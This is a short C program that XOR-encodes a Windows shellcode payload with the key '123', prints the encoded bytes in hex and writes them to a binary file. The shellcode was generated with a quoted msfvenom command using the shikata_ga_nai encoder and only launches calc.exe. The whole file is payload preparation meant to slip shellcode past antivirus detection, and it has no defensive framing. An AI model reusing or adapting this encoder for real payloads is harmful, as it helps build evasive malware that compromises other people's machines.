#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void xor_bytes(uint8_t *data, size_t data_len, const uint8_t *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len]; // i % key_len makes the key repeat when its shorter than the data
    }
}

int main() {
    // XOR key
    const char *key = "123";
    size_t key_len = strlen(key);

    // shellcode
    // msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/shikata_ga_nai -b '\x00' -i 4 -f c
    uint8_t buf[] = 
        "\xbd\x3c\x83\x90\xf6\xdb\xc7\xd9\x74\x24\xf4\x58\x2b\xc9"
        "\xb1\x45\x83\xe8\xfc\x31\x68\x10\x03\x68\x10\xde\x76\x4b"
        "\x3b\xa6\xca\xc0\x58\x95\xf5\x6d\x45\xed\x5c\xbd\x4c\xbc"
        "\x5f\x42\x8c\xba\xae\x06\x07\xc1\x92\x90\xc5\x83\x64\xc8"
        "\xf1\x72\x6d\xf0\x91\x24\xf2\x1b\x0b\x2e\x46\xc2\xff\xbc"
        "\xe2\xea\x03\xa1\x46\x07\x2c\xcd\xb2\x5c\x99\x72\x3d\xde"
        "\xb6\x29\x15\xe9\xde\x00\xd9\x5b\xdb\x00\x8b\xf2\xf0\xe0"
        "\x64\x9d\xb3\x4d\xdb\x2b\xf1\xc8\xb4\xf5\x6b\x34\x01\x0e"
        "\x5a\x9a\x8e\xe8\xbe\xec\x20\x75\x98\xa8\x2a\x6a\xcb\xf4"
        "\x2b\xd8\x56\xd1\x7e\x02\x44\x4b\x69\x59\x3e\x57\x0d\xb1"
        "\xcf\x4e\xb2\x4f\xaa\x8a\x3d\xa0\x1b\xde\xc9\xe6\x9e\x88"
        "\x7b\x42\x5f\xc1\xe7\xe5\x17\xe2\x3e\x8a\xfe\xfa\x52\x72"
        "\x71\x3d\x72\xfb\x0f\x6e\x5c\x73\xff\x4d\x9b\xcb\x38\x30"
        "\x90\x76\x7d\x10\xb2\x33\x1f\xcf\x27\x9b\x11\x5d\xba\xa0"
        "\xb3\x85\x12\xe5\x2e\xe7\x35\xd5\x91\x6d\xac\x38\xb9\xd0"
        "\x36\xd3\x4e\x7f\xf0\x1a\x4c\x43\x9e\x94\x09\x03\x83\x78"
        "\xcc\x75\x93\x9f\xd2\x8a\xbb\x90\x6f\x83\xbb\x48\xa2\x7c"
        "\x3c\x10\x59\xe3\x87\xab\x00\x90\xd2\x15\xe0\xfd\x7d\x68"
        "\x0d\x38\x24\x7b\x48\x2c\x20\x2d\x55\x75\x91\x3a\xfe\x9f"
        "\x3e\x10\x3e\x47\xcc\xf5\x4f\x72\xb3\xa7\xda\x17\xf7\xd6"
        "\x8a\x46\xda\xf9\xfc\xc1\xac\x9f\x2a\x3d\x58\xc7\x06\x5e"
        "\xcc\xac\x47\xa1\xea\x10\x76";
    size_t buf_len = sizeof(buf);

    // XOR encrypt shellcode
    xor_bytes(buf, buf_len, (const uint8_t *)key, key_len);

    // Output XOR'd bytes as hex (for viewing/readability)
    for (size_t i = 0; i < buf_len; i++) {
        printf("0x%02x,", buf[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }

    // write xor'ed shellcode to bin file
    FILE *f = fopen("encoded_shellcode.bin", "wb");
    fwrite(buf, 1, buf_len, f);
    fclose(f);

    return 0;
}